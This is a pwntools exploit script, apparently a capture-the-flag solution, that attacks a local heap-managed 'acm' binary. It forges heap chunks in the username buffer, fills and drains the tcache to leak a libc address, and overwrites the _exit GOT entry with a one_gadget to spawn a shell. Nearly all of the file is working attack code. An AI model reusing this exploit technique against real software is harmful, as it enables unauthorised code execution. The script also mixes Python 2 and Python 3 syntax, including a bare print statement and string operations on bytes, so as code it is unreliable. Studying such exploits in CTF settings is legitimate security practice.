#!/usr/bin/python3

from pwn import *
from time import sleep

username_addr = 0x4041C0
_exit_got = 0x404060 - 8

def delete( p, _id ):
	sleep( 0.05 )

	p.recvuntil( b"> " )
	p.send( b'2\n' )
	p.recvuntil( b": " )
	p.send( str( _id ).encode( 'utf-8' ) + b'\n' )

def create( p, balance, info ):
	sleep( 0.05 )

	p.recvuntil( b"> " )
	p.send( b"1\n" ) # create
	p.recvuntil( b": " )
	p.send( balance + b"\n" ) # balance
	p.recvuntil( b": " )
	p.send( info + b"\n" ) # info

if __name__ == "__main__":

	p = process( [ "./ld-2.27.so", "--library-path", "libs/", "./acm" ] )

	gdb.attach( p, '''
		file acm
		break *change_cell_info+81
		break *change_cell_info+109
		''' 
	)

	p.recvuntil( b"> " )
	p.send( b"2\n" ) # register
	p.recvuntil( b": " )

	fake_cunks = [
	    p64( username_addr + 0x20 ), p64( 0x0 ),
	    p64( 0x0 ), p64( 0x91 ),
	    p64( username_addr - 8 ) * 8,
	    b'\x00' * 0x40,
	    p64( 0x0 ), p64( 0x21 ), 
	    p64( 0x0 ), p64( 0x0 ),
	    p64( 0x0 ), p64( 0x21 ), 
	    p64( 0x0 ), p64( 0x0 ),
	]

	fake_cunks = flat( fake_cunks )

	p.send( fake_cunks + b'\n' )
	p.recvuntil( b": " )
	p.send( b'ppass\n' )

	p.recvuntil( b"> " )
	p.send( b"1\n" ) # login
	p.recvuntil( b": " )
	p.send( fake_cunks + b'\n' )
	p.recvuntil( b": " )
	p.send( b'ppass\n' )

	# make 7 chunks to fill-up tcache 
	for i in range( 7 ):
		time.sleep( 0.05 )
		create( p, b'1234', b'test_info' )

	# free 7 chunks
	for i in range( 7 ):
		time.sleep( 0.05 )
		delete( p, i )

	p.recvuntil( b"> ")
	p.send( b"2\n" ) # 

	# free fake chunk
	p.recvuntil( b": " )
	p.send( b"32\n" ) # 32 is offset of username

	p.recvuntil( b"> " )

	p.send( b"3\n" )
	p.recvuntil( b": " )
	
	p.send( b"38\n" )
	p.recvuntil( b": " )

	p.send( b"a" * 40 )
	p.recvuntil( b"> " )

	p.send( b"4\n" )

	data = p.recvuntil( "> " )
	data = data[ : data.index( '-' ) ].strip()[-6:]
	data = u64( data + '\x00\x00' )

	print ( "leak = 0x%x" % data )

	libc_base = data - 0x3ebca0
	one_gadget = libc_base + 0x10a38c

	print "libc base = 0x%x" % libc_base

	
	new_username = p64( _exit_got ) * 10

	p.send( b"2\n" ) # register
	p.recvuntil( b": " )

	p.send( new_username + b'\n' )
	p.recvuntil( b": " )
	p.send( b'ppass\n' )

	p.recvuntil( b"> " )
	p.send( b"1\n" ) # login
	p.recvuntil( b": " )
	p.send( new_username + b'\n' )
	p.recvuntil( b": " )
	p.send( b'ppass\n' )

	p.recvuntil( b"> " )

	p.send( b"3\n" )
	p.recvuntil( b": " )
	
	p.send( b"34\n" )
	p.recvuntil( b": " )

	p.send( p64( one_gadget ) )
	p.recvuntil( b"> " )

	p.send( b"4\n" )


	p.interactive()